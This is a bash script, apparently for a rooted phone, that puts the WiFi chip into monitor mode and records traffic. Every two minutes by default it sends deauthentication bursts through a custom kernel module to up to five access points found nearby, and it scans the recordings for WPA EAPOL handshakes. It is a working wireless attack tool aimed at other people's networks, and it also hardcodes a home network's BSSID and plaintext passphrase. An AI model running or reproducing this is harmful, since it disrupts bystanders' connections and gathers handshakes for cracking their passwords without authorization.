#!/bin/bash
# hybrid_capture.sh - Passive monitoring + periodic STA deauth bursts
# Runs on PHONE
# Strategy: Monitor for EAPOL continuously, periodically switch to STA
# to fire deauths, then immediately back to monitor. The deauths force
# reconnections, and some clients take >1s to reconnect, so we catch them.
#
# Args: FREQ TOTAL_SEC DEAUTH_INTERVAL [TARGET_BSSID]
set -o pipefail

FREQ="$1"
TOTAL_SEC="${2:-600}"
DEAUTH_INTERVAL="${3:-120}"  # deauth every 2 min
TARGET_BSSID="${4:-}"         # optional specific target, defaults to all
DRIVER="/tmp/qca_cld3_wlan.ko"
HOME_BSSID="8C:DE:F9:B3:9E:1F"
HOME_PSK="9006609b29404a"
PCAP="/tmp/hybrid_${FREQ}.pcap"

echo ""
echo "============================================"
echo " Hybrid Capture: Passive + Deauth"
echo " Freq: ${FREQ}MHz"
echo " Total: ${TOTAL_SEC}s, Deauth every ${DEAUTH_INTERVAL}s"
echo "============================================"
echo ""

wait_wlan0() {
    for i in $(seq 1 100); do
        [ -e /sys/class/net/wlan0 ] && return 0
        sleep 0.05
    done
    return 1
}

cleanup() {
    echo "[*] Cleaning up..."
    killall wpa_supplicant tcpdump 2>/dev/null
    rmmod wlan 2>/dev/null; sleep 2
    insmod "$DRIVER" 2>/dev/null
    wait_wlan0 && sleep 3
    systemctl start NetworkManager 2>/dev/null; sleep 2
    nmcli device wifi connect "$HOME_BSSID" password "$HOME_PSK" ifname wlan0 2>/dev/null
    echo "[*] WiFi restored."
}
trap cleanup EXIT

start_monitor() {
    killall wpa_supplicant tcpdump 2>/dev/null; sleep 0.1
    rmmod wlan 2>/dev/null; sleep 0.15
    insmod "$DRIVER" con_mode_monitor=4
    if ! wait_wlan0; then
        rmmod wlan 2>/dev/null; sleep 1
        insmod "$DRIVER" con_mode_monitor=4
        wait_wlan0 || return 1
    fi
    ip link set wlan0 up
    iw dev wlan0 set freq "$FREQ"
    return 0
}

fire_deauth_burst() {
    # Quick STA mode, fire deauths, return
    local ssid="$1"
    local bssid="$2"

    killall tcpdump 2>/dev/null; sleep 0.1
    rmmod wlan 2>/dev/null; sleep 0.15
    insmod "$DRIVER"
    wait_wlan0 || return 1
    sleep 1.5
    ip link set wlan0 up; sleep 0.3

    # Connect to target
    cat > /tmp/wpa_hybrid.conf << WPAEOF
ctrl_interface=/tmp/wpa_ctrl
network={
    ssid="$ssid"
    bssid=$bssid
    psk="dummypassword1234567890123456"
    key_mgmt=WPA-PSK
    scan_freq=$FREQ
}
WPAEOF

    rm -rf /tmp/wpa_ctrl; mkdir -p /tmp/wpa_ctrl
    dmesg -C
    wpa_supplicant -i wlan0 -c /tmp/wpa_hybrid.conf -B -D nl80211 2>/dev/null

    # Wait for PE session
    for w in $(seq 1 200); do
        dmesg | tail -50 | grep -q "Connecting to" && break
        sleep 0.05
    done

    # Wait for TX power
    for tp in $(seq 1 80); do
        local txp=$(iw dev wlan0 info 2>/dev/null | grep txpower | awk '{print $2}')
        [ -n "$txp" ] && [ "$txp" != "0.00" ] && break
        sleep 0.1
    done

    # Fire deauths
    local ok=0
    for f in $(seq 1 3); do
        dmesg -C
        insmod /tmp/petx11.ko 2>/dev/null
        dmesg | grep -q "Deauth TX" && ok=$((ok + 1))
        sleep 0.15
    done
    echo -n "${ok}/3 deauths"

    killall wpa_supplicant 2>/dev/null
    return 0
}

# ===== Stop services =====
systemctl stop NetworkManager 2>/dev/null

# ===== Scan for APs on this channel to build target list =====
echo "[*] Scanning for APs on ${FREQ}MHz..."
rmmod wlan 2>/dev/null; sleep 1
insmod "$DRIVER"; wait_wlan0; sleep 2
ip link set wlan0 up; sleep 0.5
SCAN=$(iw dev wlan0 scan freq "$FREQ" 2>/dev/null)

# Extract SSIDs and BSSIDs
AP_LIST=$(echo "$SCAN" | awk '
/^BSS / { bssid = $2; sub(/\(.*/, "", bssid) }
/SSID:/ { ssid = $0; sub(/.*SSID: /, "", ssid); if (ssid != "" && bssid != "") print bssid ":" ssid }
')
echo "  APs found:"
echo "$AP_LIST" | head -10 | while read line; do echo "    $line"; done

# ===== Start main monitoring loop =====
rm -f "$PCAP" /tmp/hybrid_*.pcap

START_TIME=$(date +%s)
DEAUTH_NUM=0
HANDSHAKE_FOUND=0

echo "[*] Starting monitor..."
start_monitor || { echo "[!] Monitor failed"; exit 1; }

# Start continuous capture
tcpdump -i wlan0 -w "$PCAP" 2>/dev/null &
TCPID=$!
echo "[*] Capturing started at $(date +%H:%M:%S)"

LAST_DEAUTH=0

while true; do
    NOW=$(date +%s)
    ELAPSED=$((NOW - START_TIME))

    if [ "$ELAPSED" -ge "$TOTAL_SEC" ]; then
        echo ""
        echo "[*] Time limit reached (${TOTAL_SEC}s)"
        break
    fi

    # Check EAPOL periodically
    if [ $((ELAPSED % 30)) -eq 0 ] && [ "$ELAPSED" -gt 0 ]; then
        if [ -f "$PCAP" ] && [ "$(stat -c%s "$PCAP" 2>/dev/null)" -gt 24 ]; then
            ECOUNT=$(tcpdump -r "$PCAP" -nn 2>/dev/null | grep -ic "EAPOL\|802.1X" || true)
            ECOUNT=$(echo "$ECOUNT" | tr -d '[:space:]')
            [ -z "$ECOUNT" ] && ECOUNT=0
            FSIZE=$(stat -c%s "$PCAP" 2>/dev/null)
            echo "  [${ELAPSED}s] ${FSIZE}B, EAPOL: $ECOUNT"
            if [ "$ECOUNT" -ge 4 ]; then
                echo "  [!!!] Enough EAPOL for handshake!"
                HANDSHAKE_FOUND=1
                break
            fi
        fi
        sleep 1
        continue
    fi

    # Time for deauth burst?
    if [ $((ELAPSED - LAST_DEAUTH)) -ge "$DEAUTH_INTERVAL" ] && [ "$ELAPSED" -gt 10 ]; then
        DEAUTH_NUM=$((DEAUTH_NUM + 1))
        echo ""
        echo "  --- Deauth burst #$DEAUTH_NUM at ${ELAPSED}s ---"

        # Stop capture
        kill $TCPID 2>/dev/null
        wait $TCPID 2>/dev/null

        # Fire deauths for each AP
        echo "$AP_LIST" | head -5 | while IFS=: read bssid ssid rest; do
            [ -z "$bssid" ] && continue
            echo -n "  $ssid ($bssid): "
            fire_deauth_burst "$ssid" "$bssid"
            echo ""
        done

        LAST_DEAUTH=$ELAPSED

        # Back to monitor
        echo "  [*] Resuming monitor..."
        start_monitor || { echo "[!] Monitor restart failed"; break; }

        # Append to same pcap (start new file, merge later)
        PCAP_PART="/tmp/hybrid_${FREQ}_part${DEAUTH_NUM}.pcap"
        tcpdump -i wlan0 -w "$PCAP_PART" 2>/dev/null &
        TCPID=$!
    fi

    sleep 1
done

# Stop capture
kill $TCPID 2>/dev/null
wait $TCPID 2>/dev/null

# Merge all pcap parts
echo "[*] Merging captures..."
PCAP_FILES=$(ls /tmp/hybrid_${FREQ}*.pcap 2>/dev/null)
TOTAL_EAPOL=0
for pf in $PCAP_FILES; do
    if [ -f "$pf" ] && [ "$(stat -c%s "$pf" 2>/dev/null)" -gt 24 ]; then
        E=$(tcpdump -r "$pf" -nn 2>/dev/null | grep -ic "EAPOL\|802.1X" || true)
        E=$(echo "$E" | tr -d '[:space:]')
        [ -z "$E" ] && E=0
        TOTAL_EAPOL=$((TOTAL_EAPOL + E))
        echo "  $pf: EAPOL=$E"
    fi
done

echo ""
echo "============================================"
echo " RESULT: Total EAPOL: $TOTAL_EAPOL"
echo " Files:"
ls -la /tmp/hybrid_${FREQ}*.pcap 2>/dev/null
echo "============================================"

if [ "$TOTAL_EAPOL" -ge 2 ]; then
    echo " Potential handshake! Pull pcap files for analysis."
fi
